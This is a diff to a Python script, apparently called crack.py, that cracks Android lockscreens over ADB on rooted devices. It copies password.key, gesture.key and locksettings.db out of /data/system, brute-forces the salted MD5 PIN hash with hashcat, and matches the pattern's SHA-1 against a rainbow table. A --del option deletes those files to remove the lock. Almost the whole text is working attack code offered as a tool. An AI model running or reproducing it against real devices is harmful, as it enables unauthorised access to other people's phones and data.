@@ -17,90 +17,111 @@ os.system("rm gesture.* &> /dev/null")
 os.system("rm password.key &> /dev/null") 
 os.system("rm out.txt &> /dev/null")
 
-try: 
-    uid = int(os.popen(f"{ADB_PATH} shell id").read().split("uid=")[1].split(" ")[0].split("(")[0])
-except:
-    print("[-] Error: No device found")
-    sys.exit(3)
+def check_root():
+    try: 
+        uid = int(os.popen(f"{ADB_PATH} shell id").read().split("uid=")[1].split(" ")[0].split("(")[0])
+    except:
+        print("[-] Error: No device found")
+        sys.exit(3)
+    if uid:
+        print("[-] No root access")
+        sys.exit(3)
 
-print("1. PIN Cracker\n2. Pattern Cracker")
+
+def show_help():
+    print("Usage: python3 crack.py [options]")
+    print("Options:")
+    print("--del: bypass lockscreen\n--pin <pin length>: crack PIN\n--pattern: crack pattern")
+    return
 
 try:
-    main_ch = int(input("> "))
-except KeyboardInterrupt:
-    sys.exit(0)
-
-if main_ch == 1:
-    if uid:
-        print("[-] No root access")
-        sys.exit(3)
-    pin_length = int(input("Enter PIN length (4~10): "))
-    if pin_length < 4 or pin_length > 10:
-        print("[-] Invalid PIN length")
-        sys.exit(3)
-
-    print("[+] connected to device")
-    print("[+] collecting encrypted PIN data...\n")
-    os.popen(f"{ADB_PATH} shell 'su -c cat /data/system/password.key' > password.key")
-    os.popen(f"{ADB_PATH} pull /data/system/locksettings.db .")
-    os.popen(f"{ADB_PATH} pull /data/system/locksettings.db-shm .")
-    os.popen(f"{ADB_PATH} pull /data/system/locksettings.db-wal .")
-    time.sleep(3)
-    conn = sqlite3.connect("locksettings.db")
-    cur = conn.cursor()
-    cur.execute("SELECT value from locksettings where name = 'lockscreen.password_salt'")
-    salt = int(cur.fetchone()[0])
-    print(f"[*] salt value in db: {salt}")
-    time.sleep(1)
-    md5_hash=open("password.key", "r").read()[40:].lower()
-    print(f"[*] md5 hash: {md5_hash}")
-    if salt > 0:
-        calc_salt = hex(salt)[2:]
-    else:
-        calc_salt = hex((1 << 64) + int(salt))[2:]
-    print(f"[*] calculated salt: {calc_salt}\n")
-
-    print(f"[*] calculating hash...\n")
-    syntax = ""
-    for i in range(pin_length):
-        syntax += "?d"
-    os.system(f"hashcat -m 10 {md5_hash}:{calc_salt} -a 3 '{syntax}' -D 2 &> /dev/null")
-    time.sleep((pin_length-3)*2)
-    os.system(f"hashcat -m 10 {md5_hash}:{calc_salt} -a 3 '{syntax}' -D 2 --show > out.txt")
-    try:
-        pin = os.popen("cat out.txt").read().split("\n")[0].split(":")[2]
-    except:
-        print("[-] Error: Crack failed.")
-        sys.exit(3)
-    print(f'[+] cracked PIN: {pin}')
-
-elif main_ch == 2:
-    if uid:
-        print("[-] No root access")
-        sys.exit(3)
-    print("[+] connected to device")
-    print("[+] collecting encrypted pattern data...\n")
-    os.popen(f"{ADB_PATH} shell 'su -c cat /data/system/gesture.key' > gesture.key")
-    time.sleep(1)
-    sha1_hash = os.popen("xxd -p gesture.key").read()[:-1]
-    print(f"[*] sha-1 encrypted data: {sha1_hash}")
-    print("[+] searching in rainbow table...\n")
-    conn = sqlite3.connect("GestureRainbowTable.db")
-    cur = conn.cursor()
-    cur.execute(f"SELECT pattern FROM RainbowTable WHERE hash = '{sha1_hash}'")
-    pattern = cur.fetchall()[0][0]
-    print(f"[+] cracked pattern: {pattern}")
-    import json
-    queue=json.loads(pattern)
-    path=[0]*9
-    for i in range(len(queue)):
-        path[queue[i]]=i+1
-    correct_answer = ""
-    for i in range(9):
-        if (i+1)%3:
-            correct_answer += f"[{str(path[i])}] "
+    if sys.argv[1] == "--help" or sys.argv[1] == "-h":
+        show_help()
+        sys.exit(0)
+    elif sys.argv[1] == "--pin":
+        try:
+            pin_length = int(sys.argv[2])
+            if pin_length < 4 or pin_length > 10:
+                print("[-] Invalid PIN length")
+                sys.exit(3)
+        except IndexError:
+            print("[-] Error: PIN length required.")
+            sys.exit(3)
+        check_root()
+        print("[+] connected to device")
+        print("[+] collecting encrypted PIN data...\n")
+        os.popen(f"{ADB_PATH} shell 'su -c cat /data/system/password.key' > password.key")
+        os.popen(f"{ADB_PATH} pull /data/system/locksettings.db .")
+        os.popen(f"{ADB_PATH} pull /data/system/locksettings.db-shm .")
+        os.popen(f"{ADB_PATH} pull /data/system/locksettings.db-wal .")
+        time.sleep(3)
+        conn = sqlite3.connect("locksettings.db")
+        cur = conn.cursor()
+        cur.execute("SELECT value from locksettings where name = 'lockscreen.password_salt'")
+        salt = int(cur.fetchone()[0])
+        print(f"[*] salt value in db: {salt}")
+        time.sleep(1)
+        md5_hash=open("password.key", "r").read()[40:].lower()
+        print(f"[*] md5 hash: {md5_hash}")
+        if salt > 0:
+            calc_salt = hex(salt)[2:]
         else:
-            correct_answer += f"[{str(path[i])}]\n\n"
-    correct_answer = correct_answer[:-1]
-    print(correct_answer)
+            calc_salt = hex((1 << 64) + int(salt))[2:]
+        print(f"[*] calculated salt: {calc_salt}\n")
 
+        print(f"[*] calculating hash...\n")
+        syntax = ""
+        for i in range(pin_length):
+            syntax += "?d"
+        os.system(f"hashcat -m 10 {md5_hash}:{calc_salt} -a 3 '{syntax}' -D 2 &> /dev/null")
+        time.sleep((pin_length-3)*2)
+        os.system(f"hashcat -m 10 {md5_hash}:{calc_salt} -a 3 '{syntax}' -D 2 --show > out.txt")
+        try:
+            pin = os.popen("cat out.txt").read().split("\n")[0].split(":")[2]
+        except:
+            print("[-] Error: Crack failed.")
+            sys.exit(3)
+        print(f'[+] cracked PIN: {pin}')
+    elif sys.argv[1] == "--pattern":
+        check_root()
+        print("[+] connected to device")
+        print("[+] collecting encrypted pattern data...\n")
+        os.popen(f"{ADB_PATH} shell 'su -c cat /data/system/gesture.key' > gesture.key")
+        time.sleep(1)
+        sha1_hash = os.popen("xxd -p gesture.key").read()[:-1]
+        print(f"[*] sha-1 encrypted data: {sha1_hash}")
+        print("[+] searching in rainbow table...\n")
+        conn = sqlite3.connect("GestureRainbowTable.db")
+        cur = conn.cursor()
+        cur.execute(f"SELECT pattern FROM RainbowTable WHERE hash = '{sha1_hash}'")
+        pattern = cur.fetchall()[0][0]
+        print(f"[+] cracked pattern: {pattern}")
+        import json
+        queue=json.loads(pattern)
+        path=[0]*9
+        for i in range(len(queue)):
+            path[queue[i]]=i+1
+        correct_answer = ""
+        for i in range(9):
+            if (i+1)%3:
+                correct_answer += f"[{str(path[i])}] "
+            else:
+                correct_answer += f"[{str(path[i])}]\n\n"
+        correct_answer = correct_answer[:-1]
+        print(correct_answer)
+    elif sys.argv[1] == "--del":
+        check_root()
+        print("[+] connected to device")
+        print("[+] bypassing lockscreen...\n")
+        os.system(f"{ADB_PATH} shell 'su -c rm /data/system/gesture.key'")
+        os.system(f"{ADB_PATH} shell 'su -c rm /data/system/locksettings.db'")
+        os.system(f"{ADB_PATH} shell 'su -c rm /data/system/locksettings.db-shm'")
+        os.system(f"{ADB_PATH} shell 'su -c rm /data/system/locksettings.db-wal'")
+        os.system(f"{ADB_PATH} shell 'su -c rm /data/system/password.key'")
+        print("[+] done")
+    else:
+        show_help()
+        sys.exit(3)
+except IndexError:
+    show_help()
+    sys.exit(3)
